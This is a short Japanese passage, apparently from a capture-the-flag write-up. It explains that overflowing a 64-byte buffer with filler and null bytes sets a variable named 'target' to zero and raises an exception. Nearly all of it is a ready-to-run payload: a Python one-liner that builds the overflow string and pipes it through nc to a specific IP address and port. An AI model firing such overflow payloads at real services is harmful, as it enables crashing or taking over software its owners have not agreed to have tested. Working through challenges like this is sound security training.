64バイト以上の適当な文字+ヌルバイトを送ることで`target`の値を0にし、例外を発生させることができる。

ペイロードは以下。

```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x00'*8 + b'\n')" | nc -q 1 34.170.146.252 57267
```